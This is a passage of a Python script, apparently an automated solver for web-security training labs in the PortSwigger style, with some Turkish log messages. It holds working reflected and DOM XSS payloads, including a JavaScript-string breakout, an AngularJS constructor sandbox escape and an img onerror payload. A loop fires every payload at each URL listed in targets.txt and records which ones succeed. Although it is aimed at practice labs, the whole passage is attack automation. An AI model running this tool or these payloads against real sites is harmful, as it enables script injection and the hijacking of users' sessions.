    {
        "name": "Reflected XSS into a JavaScript string with angle brackets HTML encoded",
        "method": attack_get_parameter_xss,
        "args": {"parameter_name": "search", "path": "/"},
        "payloads_to_try": ["'; alert(1);//"]
    },
    {
        "name": "DOM XSS in document.write sink using source location.search inside a select element",
        "method": attack_get_parameter_xss,
        "args": {"parameter_name": "storeId", "path": "/product"},
        "payloads_to_try": ["<script>alert(1)</script>"]
    },
    {
        "name": "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded",
        "method": attack_get_parameter_xss,
        "args": {"parameter_name": "search", "path": "/"},
        "payloads_to_try": ["{{constructor.constructor('alert(1)')()}}"]
    }
]


def run_all_labs():
    """
    Main function to run XSS lab solving process.
    It reads target URLs from 'targets.txt' and attempts to solve each using
    all defined attack strategies/methods.
    """
    log_message(Fore.MAGENTA + "XSS Lab Solver Başlatılıyor..." + Style.RESET_ALL, level="INFO")
    
    overall_lab_results = {}
    target_urls = read_targets() # Read URLs from targets.txt

    if not target_urls:
        log_message("No target URLs found in targets.txt. Please add URLs to test.", level="ERROR")
        return

    for target_url in target_urls:
        log_message(f"\n===== [TESTING URL] {target_url} =====", level="INFO")
        
        solved_this_url = False
        
        # Iterate through all defined attack strategies/lab configurations
        for lab_config_strategy in LAB_CONFIGS:
            strategy_name = lab_config_strategy["name"] # Name of the attack strategy/lab type
            attack_method = lab_config_strategy["method"]
            method_args = lab_config_strategy.get("args", {}).copy() # Use .copy() to avoid modifying original dict
            payloads_to_use = lab_config_strategy.get("payloads_to_try", [])
            
            # The lab_name for reporting should include the target URL and the strategy name
            report_lab_name = f"{target_url} - Strategy: {strategy_name}"

            log_message(f"Trying Attack Strategy: {strategy_name} for {target_url}", level="INFO")

            # Handle specific lab solvers or methods that craft their own payload
            if attack_method == solve_dom_xss_jquery_hashchange_new_lab_specific:
                # This solver uses the target_url directly and crafts its own payload
                if attack_method(report_lab_name, target_url, **method_args):
                    solved_this_url = True
                    break # Lab solved, move to next URL
            elif "csrf" in attack_method.__name__ or "password" in attack_method.__name__:
                # These methods also craft their own specific payloads, pass an empty string
                # Ensure the method signature matches: (base_url, payload, lab_name, ...)
                if attack_method(target_url, "", report_lab_name, **method_args):
                    solved_this_url = True
                    break # Lab solved, move to next URL
            elif payloads_to_use:
                # Use specific payloads defined for this strategy
                for payload in payloads_to_use:
                    if attack_method(target_url, payload, report_lab_name, **method_args):
                        solved_this_url = True
                        break # Lab solved by specific payload, move to next URL
                if solved_this_url:
                    break # Lab solved by specific payload, move to next URL
            else:
                # Fallback to general payloads if no specific payloads are given for this strategy
                general_payloads = read_payloads()
                for payload in general_payloads:
                    if attack_method(target_url, payload, report_lab_name, **method_args):
                        solved_this_url = True
                        break # Lab solved, move to next URL
                if solved_this_url:
                    break # Lab solved by general payload, move to next URL
        
        if solved_this_url:
            overall_lab_results[target_url] = "SOLVED"
        else:
            overall_lab_results[target_url] = "NOT SOLVED"
            log_message(f"--- URL: {target_url} NOT SOLVED with any current attack strategies/payloads. ---", level="WARNING")
    
    # Final Summary - concise and at the end
    log_message("\n" + "="*50, level="INFO")
    log_message("--- XSS Lab Solver - Final Summary ---", level="INFO")
    log_message("="*50, level="INFO")

    for url, status in overall_lab_results.items():
        if status == "SOLVED":
            log_message(f"- {url}: {status}", level="SUCCESS")
        elif status == "NOT SOLVED":
            log_message(f"- {url}: {status}", level="WARNING")

    log_message(Fore.BLUE + "\n[BİTTİ] Tüm lab testleri tamamlandı." + Style.RESET_ALL, level="INFO")


if __name__ == "__main__":
    # Create a dummy xss_payloads.txt if it doesn't exist, for testing purposes
    if not os.path.exists(os.path.join(PAYLOADS_DIR, "xss_payloads.txt")):
        with open(os.path.join(PAYLOADS_DIR, "xss_payloads.txt"), "w") as f:
            f.write("<script>alert('XSS')</script>\n")
            f.write("<img src=x onerror=alert(1)>\n")
            f.write("'-alert(document.domain)-'\n")
        log_message(f"Dummy 'xss_payloads.txt' created in {PAYLOADS_DIR}", level="INFO")

    # Create a dummy targets.txt if it doesn't exist, for demonstration
    targets_file_path = os.path.join(LOGS_DIR, "targets.txt")
    if not os.path.exists(targets_file_path):
        with open(targets_file_path, "w") as f:
            f.write("https://example.com/lab1\n")
            f.write("https://example.com/lab2\n")
            f.write("# This is a comment\n")
            f.write("https://example.com/lab3\n")
        log_message(f"Dummy 'targets.txt' created in {LOGS_DIR}. Please update it with your lab URLs.", level="INFO")

    run_all_labs()
